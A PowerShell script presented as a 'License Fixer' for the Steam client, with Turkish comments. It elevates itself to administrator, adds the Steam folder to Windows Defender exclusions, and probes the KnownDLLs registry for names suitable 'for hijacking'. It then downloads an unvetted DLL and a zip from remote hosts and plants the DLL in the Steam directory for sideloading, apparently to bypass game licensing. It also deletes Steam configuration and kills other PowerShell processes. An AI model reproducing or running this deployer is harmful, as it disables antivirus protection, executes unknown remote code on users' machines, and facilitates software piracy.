Try {
    $MethodDefinition = @'
    [DllImport("kernel32.dll")]
    public static extern bool SetConsoleMode(IntPtr hConsoleHandle, uint dwMode);
    [DllImport("kernel32.dll")]
    public static extern bool GetConsoleMode(IntPtr hConsoleHandle, out uint lpMode);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetStdHandle(int nStdHandle);
'@
    $Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name "Kernel32Functions" -Namespace Win32 -PassThru -ErrorAction SilentlyContinue
}
catch {}

function Disable-QuickEdit {
    try {
        $hInput = $Kernel32::GetStdHandle(-10) 
        $mode = 0
        if ($Kernel32::GetConsoleMode($hInput, [ref]$mode)) {
            $mode = $mode -band -not (0x0040 -bor 0x0020)
            $Kernel32::SetConsoleMode($hInput, $mode -bor 0x0080)
        }
    }
    catch { }
}

Disable-QuickEdit
$host.UI.RawUI.BackgroundColor = "Black"
$host.UI.RawUI.ForegroundColor = "White"
$host.UI.RawUI.WindowTitle = "License Fixer"
Clear-Host

$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
$isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "`n [!] Requesting Administrative Privileges..." -ForegroundColor Yellow
    $scriptPath = Join-Path $env:TEMP "license_fix_$(Get-Random).ps1"
    try {
        $scriptText = $MyInvocation.MyCommand.ScriptBlock.ToString()
        if ([string]::IsNullOrWhiteSpace($scriptText)) { throw "No script block" }
        Set-Content -Path $scriptPath -Value $scriptText -Encoding UTF8 -Force
    }
    catch {
        $scriptText = @"
`$steamRegPath = 'HKCU:\Software\Valve\Steam'
`$steamPath = ""
if (Test-Path `$steamRegPath) {
    `$properties = Get-ItemProperty -Path `$steamRegPath -ErrorAction SilentlyContinue
    if (`$properties -and 'SteamPath' -in `$properties.PSObject.Properties.Name) {
        `$steamPath = `$properties.SteamPath
    }
}
if ([string]::IsNullOrWhiteSpace(`$steamPath) -or -not (Test-Path `$steamPath -PathType Container)) {
    Write-Host "Steam not found. Please install Steam first." -ForegroundColor Red
    Start-Sleep 5
    exit
}
`$dllUrl = "https://zdb2.pages.dev/dwmapi.dll"
`$dllOutput = Join-Path `$steamPath "dwmapi.dll"
try {
    Invoke-RestMethod -Uri `$dllUrl -OutFile `$dllOutput -ErrorAction Stop
    Write-Host "[+] dwmapi.dll installed successfully!" -ForegroundColor Green
}
catch {
    Write-Host "[-] Download failed." -ForegroundColor Red
    Start-Sleep 5
}
"@
        Set-Content -Path $scriptPath -Value $scriptText -Encoding UTF8 -Force
    }
    Start-Process -FilePath "powershell.exe" -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
    exit
}

Disable-QuickEdit
cls
[Console]::InputEncoding = [System.Text.Encoding]::UTF8

$localPath = Join-Path $env:LOCALAPPDATA "steam"
$steamRegPath = 'HKCU:\Software\Valve\Steam'
$steamPath = ""

# --- Yardımcı Fonksiyonlar ---

function Write-Log($message, $type) {
    switch ($type) {
        "SUCCESS" { Write-Host "[+] $message" -ForegroundColor Green }
        "ERROR"   { Write-Host "[-] $message" -ForegroundColor Red }
        "WARNING" { Write-Host "[!] $message" -ForegroundColor Yellow }
        default   { Write-Host "[*] $message" }
    }
}

function Remove-ItemIfExists($path) {
    if ([string]::IsNullOrWhiteSpace($path)) { return }
    try {
        $fullPath = $ExecutionContext.SessionState.Path.GetUnresolvedProviderPathFromPSPath($path)
        if (Test-Path -LiteralPath $fullPath) {
            Start-Process cmd -ArgumentList "/c icacls ""$fullPath"" /reset /T /C" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
            Start-Process cmd -ArgumentList "/c attrib -s -h -r ""$fullPath""" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
            Remove-Item -LiteralPath $fullPath -Recurse -Force -Confirm:$false -ErrorAction SilentlyContinue
        }
    }
    catch { }
}

function ForceStopProcess($processName) {
    try {
        Get-Process -Name $processName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
        if (Get-Process -Name $processName -ErrorAction SilentlyContinue) {
            Start-Process cmd -ArgumentList "/c taskkill /f /im $processName.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 1
        }
    }
    catch { }
}

function CheckAndPromptProcess($processName, $message) {
    $maxWait = 30
    $waited = 0
    while ((Get-Process -Name $processName -ErrorAction SilentlyContinue) -and $waited -lt $maxWait) {
        Write-Host $message -ForegroundColor Red
        Start-Sleep 1.5
        $waited += 1.5
    }
}

# --- Windows Sürüm ve KnownDLL Kontrolü ---

function Get-WindowsInfo {
    try {
        $winVer = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -ErrorAction Stop
        $productName = $winVer.ProductName
        $build = [int]$winVer.CurrentBuild
        $editionId = $winVer.EditionID
        $displayVersion = $winVer.DisplayVersion

        # Windows 11 tespiti (build 22000+ ve productName "Windows 11" veya "11" içeriyor)
        $isWin11 = ($build -ge 22000) -or ($productName -match "11")
        
        $isHome = ($productName -match "Home") -or ($editionId -match "Core" -and -not ($productName -match "Pro"))
        $isPro = ($productName -match "Pro") -or ($editionId -match "Professional")
        $isEnterprise = ($productName -match "Enterprise") -or ($editionId -match "Enterprise")
        $isEducation = ($productName -match "Education") -or ($editionId -match "Education")
        $isLtsc = $productName -match "LTSC"
        $isServer = $productName -match "Server"
        $isOld = $build -le 9600

        # Eğer Win11 ise productName'i düzelt
        if ($isWin11 -and $productName -notmatch "11") {
            $productName = "Windows 11 " + ($productName -replace "Windows 10 ", "")
        }

        return @{
            ProductName    = $productName
            Build          = $build
            DisplayVersion = $displayVersion
            EditionID      = $editionId
            IsWin11        = $isWin11
            IsHome         = $isHome
            IsPro          = $isPro
            IsEnterprise   = $isEnterprise
            IsEducation    = $isEducation
            IsLtsc         = $isLtsc
            IsServer       = $isServer
            IsOld          = $isOld
        }
    }
    catch {
        return $null
    }
}

function Test-KnownDll {
    param([string]$DllName)

    $knownDllPaths = @(
        "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs",
        "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs32"
    )

    foreach ($path in $knownDllPaths) {
        if (Test-Path $path) {
            $knownDlls = Get-ItemProperty -Path $path -ErrorAction SilentlyContinue
            if ($knownDlls) {
                foreach ($prop in $knownDlls.PSObject.Properties) {
                    if ($prop.Name -eq $DllName -or $prop.Value -eq $DllName) {
                        return $true
                    }
                }
            }
        }
    }
    return $false
}

# Build bazında bilinen riskli sürümler (dwmapi.dll KnownDLL)
function Get-KnownDllRiskBuilds {
    return @{
        17763 = $true   # Win10 1809 LTSC / Server 2019
        20348 = $true   # Server 2022
        20344 = $true   # Server 2022 preview
        14393 = $true   # Win10 1607 / Server 2016
        10240 = $true   # Win10 1507
        9600  = $true   # Win8.1
        9200  = $true   # Win8
        7601  = $true   # Win7 SP1
        6002  = $true   # Vista SP2 / Server 2008
        # Windows 11 riskli build'ler (varsa)
        22621 = $false  # Win11 22H2 - genelde sorun yok
        22631 = $false  # Win11 23H2 - genelde sorun yok
        26100 = $false  # Win11 24H2 - genelde sorun yok
    }
}

# --- DLL Strateji Seçici ---

function Get-SuitableDllStrategy {
    param([string]$SteamPath)

    $winInfo = Get-WindowsInfo
    $riskBuilds = Get-KnownDllRiskBuilds
    $forceDll = $null

    Write-Host "[*] Detecting Windows version..." -ForegroundColor Cyan
    if ($winInfo) {
        Write-Log "$($winInfo.ProductName) (Build $($winInfo.Build), v$($winInfo.DisplayVersion))" "SUCCESS"
        if ($winInfo.IsHome)   { Write-Log "Edition: Home" "SUCCESS" }
        elseif ($winInfo.IsPro) { Write-Log "Edition: Pro" "SUCCESS" }
        elseif ($winInfo.IsEnterprise) { Write-Log "Edition: Enterprise" "SUCCESS" }
        elseif ($winInfo.IsEducation) { Write-Log "Edition: Education" "SUCCESS" }
        if ($winInfo.IsLtsc)   { Write-Log "Edition: LTSC" "WARNING" }
        if ($winInfo.IsServer) { Write-Log "Edition: Server" "WARNING" }
        if ($winInfo.IsOld)    { Write-Log "Legacy Windows" "WARNING" }

        # Build bazında risk kontrolü
        if ($riskBuilds.ContainsKey($winInfo.Build)) {
            Write-Log "Build $($winInfo.Build) is known to have dwmapi.dll as KnownDLL" "WARNING"
            Write-Log "Forcing xinput1_4.dll for this build" "WARNING"
            $forceDll = "xinput1_4.dll"
        }
    }
    else {
        Write-Log "Could not detect Windows version" "WARNING"
    }

    # Build bazında zorlama varsa direkt dön
    if ($forceDll) {
        return @{ PreferredDll = $forceDll }
    }

    # Yoksa registry'den gerçek KnownDLL kontrolü
    Write-Host "[*] Checking KnownDLL registry for hijack candidates..." -ForegroundColor Cyan

    $testDlls = @("dwmapi.dll", "winhttp.dll", "xinput1_4.dll")
    $results = @{}
    $allKnown = $true

    foreach ($dll in $testDlls) {
        $isKnown = Test-KnownDll -DllName $dll
        $results[$dll] = $isKnown
        if ($isKnown) {
            Write-Log "$dll is a KnownDLL - will NOT work for hijacking" "WARNING"
        }
        else {
            Write-Log "$dll is NOT a KnownDLL - safe to use for hijacking" "SUCCESS"
            $allKnown = $false
        }
    }

    # LTSC/Server/Old: xinput1_4 en güvenlisi
    if ($winInfo -and ($winInfo.IsLtsc -or $winInfo.IsServer -or $winInfo.IsOld)) {
        Write-Log "LTSC/Server/Old: Prioritizing xinput1_4.dll" "WARNING"
        if (-not $results["xinput1_4.dll"]) { return @{ PreferredDll = "xinput1_4.dll" } }
        if (-not $results["winhttp.dll"])   { return @{ PreferredDll = "winhttp.dll" } }
        if (-not $results["dwmapi.dll"])    { return @{ PreferredDll = "dwmapi.dll" } }
    }
    # Home/Pro: dwmapi dene
    # Home/Pro (Win10 veya Win11): dwmapi dene
    elseif ($winInfo -and ($winInfo.IsHome -or $winInfo.IsPro)) {
        if ($winInfo.IsWin11) {
            Write-Log "Windows 11 $($winInfo.EditionID): Trying dwmapi.dll first" "SUCCESS"
        } else {
            Write-Log "Windows 10 $($winInfo.EditionID): Trying dwmapi.dll first" "SUCCESS"
        }
        if (-not $results["dwmapi.dll"])    { return @{ PreferredDll = "dwmapi.dll" } }
        if (-not $results["winhttp.dll"])   { return @{ PreferredDll = "winhttp.dll" } }
        if (-not $results["xinput1_4.dll"]) { return @{ PreferredDll = "xinput1_4.dll" } }
    }
    # Enterprise/Education/diger
    else {
        Write-Log "Enterprise/Other: Normal priority" "SUCCESS"
        if (-not $results["dwmapi.dll"])    { return @{ PreferredDll = "dwmapi.dll" } }
        if (-not $results["winhttp.dll"])   { return @{ PreferredDll = "winhttp.dll" } }
        if (-not $results["xinput1_4.dll"]) { return @{ PreferredDll = "xinput1_4.dll" } }
    }

    # Hicbiri calismazsa xinput1_4
    Write-Log "Forcing xinput1_4.dll as final fallback" "WARNING"
    return @{ PreferredDll = "xinput1_4.dll" }
}

# --- Baslangic Islemleri ---

$filePathToDelete = Join-Path $env:USERPROFILE "get.ps1"
Remove-ItemIfExists $filePathToDelete

ForceStopProcess "steam"
ForceStopProcess "steamservice"
CheckAndPromptProcess "steam" "[Please exit Steam client first]"

# Steam Yolu Kontrolu
try {
    if (Test-Path $steamRegPath) {
        $properties = Get-ItemProperty -Path $steamRegPath -ErrorAction SilentlyContinue
        if ($properties -and 'SteamPath' -in $properties.PSObject.Properties.Name -and $properties.SteamPath) {
            $steamPath = $properties.SteamPath -replace '/','\'
        }
    }
}
catch { }

if ([string]::IsNullOrWhiteSpace($steamPath) -or -not (Test-Path -LiteralPath $steamPath -PathType Container)) {
    Write-Host "[-] Official Steam client is not installed on your computer. Please install it and try again." -ForegroundColor Red
    Start-Sleep 10
    exit
}

# --- Windows Defender ---
try {
    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
        $existing = (Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath
        if ($existing -and $existing -contains $steamPath) {
            Write-Log "Steam folder already excluded from Defender." "SUCCESS"
        }
        else {
            Add-MpPreference -ExclusionPath $steamPath -ErrorAction SilentlyContinue
            Write-Log "Steam folder added to Defender exclusions." "SUCCESS"
        }
    }
}
catch {
    Write-Log "Could not configure Defender (non-critical, continuing...)" "WARNING"
}

# --- DLL Stratejisini Belirle ---
$dllStrategy = Get-SuitableDllStrategy -SteamPath $steamPath
$targetDll = $dllStrategy.PreferredDll
Write-Log "Selected DLL for hijacking: $targetDll" "SUCCESS"

# Eski DLL'leri temizle
$oldFiles = @(
    "winhttp.dll", "dwmapi.dll.bak", "winhttp.dll.bak", "xinput1_4.dll.bak", "dwmapi_update.dll", "winhttp_update.dll", "xinput1_4_update.dll", "dwmapi.dll", "SYS_0xA7.dll", "hid.dll",
    "xinput1_4.dll", "version.dll", "winmm.dll","OpenSteamTool.dll",
    "SYS_0xA7.toml", "opensteamtool.toml", "Gamevia.dll"
)
foreach ($file in $oldFiles) {
    Remove-ItemIfExists (Join-Path $steamPath $file)
}

# --- URL'ler (Tek DLL kaynağı, hedef isim değişecek) ---
$primaryUrls = @(
    "https://zdb2.pages.dev/Gamevia.zip",
    "https://github.com/WolfGames156/zdb2/raw/refs/heads/main/Gamevia.zip",
    "https://raw.githubusercontent.com/WolfGames156/zdb2/main/Gamevia.zip"
)

# Ana DLL URL'si (dwmapi.dll olarak host edilmiş, farklı isimle kaydedilecek)
$dllSourceUrl = @(
    "https://zdb2.pages.dev/dwmapi.dll",
    "https://github.com/WolfGames156/zdb2/raw/refs/heads/main/dwmapi.dll",
    "https://raw.githubusercontent.com/WolfGames156/zdb2/main/dwmapi.dll"
)

# --- Dosya Indirme Fonksiyonu ---
function Download-FileWithFallback {
    param([string[]]$Urls, [string]$OutputPath)
    foreach ($url in $Urls) {
        try {
            Write-Host "[*] Trying: $url" -ForegroundColor Gray
            [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
            Invoke-RestMethod -Uri $url -OutFile $OutputPath -TimeoutSec 30 -ErrorAction Stop
            if ((Test-Path -LiteralPath $OutputPath) -and ((Get-Item -LiteralPath $OutputPath).Length -gt 0)) {
                Write-Log "Downloaded successfully" "SUCCESS"
                return $true
            }
        }
        catch {
            Write-Host "[!] Failed: $url ($($_.Exception.Message))" -ForegroundColor Yellow
        }
    }
    return $false
}

# --- Ana Fonksiyon ---

function PwStart {
    try {
        if ([string]::IsNullOrWhiteSpace($steamPath)) {
            Write-Log "Steam path is empty, cannot continue." "ERROR"
            return
        }

        if (!(Test-Path -LiteralPath $localPath)) {
            try { New-Item -LiteralPath $localPath -ItemType Directory -Force -ErrorAction Stop | Out-Null } catch { }
        }

        # Steam yapilandirma temizligi
        Remove-ItemIfExists (Join-Path $steamPath "appcache")
        Remove-ItemIfExists (Join-Path $steamPath "steam.cfg")
        Remove-ItemIfExists (Join-Path $steamPath "package\beta")
        Remove-ItemIfExists (Join-Path $env:LOCALAPPDATA "Microsoft\Tencent")

        # --- Gamevia.zip indir ve ayikla ---
        $gamesDataPath = Join-Path $env:APPDATA "gamesdata"
        if (!(Test-Path -LiteralPath $gamesDataPath)) {
            try { New-Item -LiteralPath $gamesDataPath -ItemType Directory -Force -ErrorAction Stop | Out-Null } catch { }
        }

        $zipLocalSys = Join-Path $env:TEMP "Gamevia_$(Get-Random).zip"
        $successSys = Download-FileWithFallback -Urls $primaryUrls -OutputPath $zipLocalSys

        if ($successSys -and (Test-Path -LiteralPath $zipLocalSys)) {
            try {
                Expand-Archive -LiteralPath $zipLocalSys -DestinationPath $gamesDataPath -Force -ErrorAction Stop
                Write-Log "Gamevia.zip extracted to $gamesDataPath" "SUCCESS"

                $depotKeysPath = Join-Path $gamesDataPath "depotkeys.json"
                if (Test-Path -LiteralPath $depotKeysPath) {
                    Remove-Item -LiteralPath $depotKeysPath -Force -ErrorAction SilentlyContinue
                    Write-Log "depotkeys.json removed" "SUCCESS"
                }
            }
            catch {
                Write-Log "Failed to extract Gamevia.zip: $($_.Exception.Message)" "ERROR"
            }
        }
        else {
            Write-Log "Gamevia.zip could not be downloaded from any source." "WARNING"
        }

        # Gecici dosyayi sil
        if (-not [string]::IsNullOrWhiteSpace($zipLocalSys) -and (Test-Path -LiteralPath $zipLocalSys)) {
            try { Remove-Item -LiteralPath $zipLocalSys -Force -ErrorAction Stop } catch { }
        }

        # --- Hedef DLL'i indir ---
        # --- Hedef DLL'i indir (URL her zaman dwmapi.dll, hedef isim stratejiye göre) ---
        $dllOutputPath = Join-Path $steamPath $targetDll
        Remove-ItemIfExists $dllOutputPath

        $success = Download-FileWithFallback -Urls $dllSourceUrl -OutputPath $dllOutputPath

        if ($success -and (Test-Path -LiteralPath $dllOutputPath)) {
            Write-Log "$targetDll installed to $steamPath (source: dwmapi.dll URL)" "SUCCESS"
            try { attrib -s -h -r "`"$dllOutputPath`"" | Out-Null } catch { }
        }
        else {
            Write-Log "$targetDll could not be downloaded. Trying fallback DLLs..." "WARNING"

            $fallbackDeployed = $false
            foreach ($dll in $fallbackDlls) {
                $fallbackPath = Join-Path $steamPath $dll
                Remove-ItemIfExists $fallbackPath
                # Aynı URL'yi kullan, sadece hedef dosya adı farklı
                $fallbackSuccess = Download-FileWithFallback -Urls $dllSourceUrl -OutputPath $fallbackPath
                if ($fallbackSuccess -and (Test-Path -LiteralPath $fallbackPath)) {
                    Write-Log "Fallback $dll deployed successfully! (source: dwmapi.dll URL)" "SUCCESS"
                    try { attrib -s -h -r "`"$fallbackPath`"" | Out-Null } catch { }
                    $fallbackDeployed = $true
                    break
                }
            }

            if (-not $fallbackDeployed) {
                Write-Log "All DLL downloads failed. Check your internet connection." "ERROR"
                Start-Sleep 5
                return
            }
        }

        # Steam'i Baslat
        $steamExePath = Join-Path $steamPath "steam.exe"
        if (Test-Path -LiteralPath $steamExePath) {
            try {
                Start-Process -FilePath $steamExePath -WindowStyle Normal
                Start-Sleep 2
                Start-Process "steam://"
                Write-Log "Steam started successfully." "SUCCESS"
            }
            catch {
                Write-Log "Could not start Steam automatically. Please start it manually." "WARNING"
            }
        }

        Write-Log "License fix applied. Please login to Steam to activate." "SUCCESS"

        for ($i = 3; $i -ge 0; $i--) {
            Write-Host "`r[*] This window will close in $i seconds...   " -NoNewline
            Start-Sleep -Seconds 1
        }

        Get-Process powershell, pwsh -ErrorAction SilentlyContinue |
            Where-Object { $_.Id -ne $PID } |
            Stop-Process -Force -ErrorAction SilentlyContinue

        Start-Sleep -Milliseconds 500
        Stop-Process -Id $PID -Force
        exit
    }
    catch {
        Write-Host "`n===== ERROR =====" -ForegroundColor Red
        Write-Host "Message : $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "Type    : $($_.Exception.GetType().FullName)" -ForegroundColor Yellow
        if ($_.InvocationInfo) {
            Write-Host "Line    : $($_.InvocationInfo.ScriptLineNumber)" -ForegroundColor Yellow
            Write-Host "Command : $($_.InvocationInfo.Line.Trim())" -ForegroundColor Yellow
        }
        Write-Host "`nPress Enter to exit." -ForegroundColor Cyan
        Read-Host
    }
}

PwStart
